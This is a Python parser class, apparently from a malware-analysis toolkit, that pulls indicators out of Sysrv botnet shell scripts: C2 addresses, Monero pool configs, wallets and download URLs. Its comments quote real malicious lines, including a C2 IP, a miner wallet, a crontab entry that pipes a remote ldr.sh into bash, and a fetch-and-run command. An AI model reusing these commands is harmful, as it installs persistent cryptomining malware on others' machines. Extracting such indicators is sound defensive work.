import os
import inspect

from mishell.shell_family import Alpha


class sysrv_sh(Alpha):
    NAME = "sysrv_sh"

    def __init__(self):
        super(sysrv_sh, self).__init__()
        self.anchor_processor = {}
        self.file_abs_path = None
        self.lines = []
        self._inspect_anchor_processor()

        self.cache = {}

    def _read_file(self, file_abs_path):
        self.file_abs_path = file_abs_path
        with open(file_abs_path, "r") as f:
            self.lines = f.readlines()

    def do(self, data, *args, **kwargs):
        for file_abs_path, anchor_lst in data.items():
            md5 = os.path.basename(file_abs_path)
            self._read_file(file_abs_path)
            self._find_anchor_processor(anchor_lst, md5)

    def get_process_result(self):
        pass

    def _find_anchor_processor(self, anchor_dct, md5):
        print("Processing md5 {}".format(md5))
        for anchor, value in anchor_dct.items():
            func = self.anchor_processor.get(anchor, None)
            if func is not None:
                func(anchor, value)

    def _inspect_anchor_processor(self):
        for name, data in inspect.getmembers(self):
            if name.startswith("anchor") and inspect.ismethod(data):
                self.anchor_processor[name] = data

    # cc=http://185.239.242.71
    def anchor_cc(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    url = line.split("=")[1]
                    print(url)
                except Exception as e:
                    return

    # {"url": "pool.minexmr.com:5555", "user": "49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.linux"},
    # {"url": "xmr.f2pool.com:13531", "user": "49dnvYkWkZNPrDj3KF8fR1BHLBfiVArU6Hu61N9gtrZWgbRptntwht5JUrXX1ZeofwPwC6fXNxPZfGjNEChXttwWE3WGURa.linux", "pass": "x"}
    def anchor_config(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            if line.startswith(value):
                try:
                    import json
                    line = line.strip(",")
                    raw = json.loads(line)
                    url = raw["url"]
                    ip = url.split(":")[0]
                    port = url.split(":")[1]
                    wallet = raw["user"]
                    print(ip, port, wallet)
                except Exception as e:
                    return

    # echo "*/9 * * * * (curl -fsSL $cc/ldr.sh || wget -q -O - $cc/ldr.sh) | bash > /dev/null 2>&1" | crontab -
    def anchor_persistent(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            url = ""
            if line.startswith(value):
                try:
                    lst = line.split(" ")
                    for item in lst:
                        if item.startswith("$cc"):
                            for line in self.lines:
                                if line.startswith("cc="):
                                    line = line.strip()
                                    part1 = line.split("=")[1]
                                    url = part1 + "/" + item.split("/")[1]
                                    url = url.replace(")", "")
                                    print(url)
                                    break
                except Exception as e:
                    return

    # get $cc/sysrr $sys; nohup ./$sys 1>/dev/null 2>&1 &
    def anchor_get(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            url = ""
            if line.startswith(value):
                try:
                    lst = line.split(" ")
                    for item in lst:
                        if item.startswith("$cc"):
                            for line in self.lines:
                                if line.startswith("cc="):
                                    line = line.strip()
                                    part1 = line.split("=")[1]
                                    url = part1 + "/" + item.split("/")[1]
                                    url = url.replace("\"", "")
                                    print(url)
                                    break
                except Exception as e:
                    return

    # get "$cc/sysrv" $sys
    def anchor_get_1(self, anchor, value):
        for line in self.lines:
            line = line.strip()
            url = ""
            if line.startswith(value):
                try:
                    lst = line.split(" ")
                    for item in lst:
                        if item.startswith("\"$cc"):
                            for line in self.lines:
                                if line.startswith("cc="):
                                    line = line.strip()
                                    part1 = line.split("=")[1]
                                    item = item.split("\"")[1]
                                    url = part1 + "/" + item.split("/")[1]
                                    url = url.replace("\"", "")
                                    print(url)
                                    break
                except Exception as e:
                    return
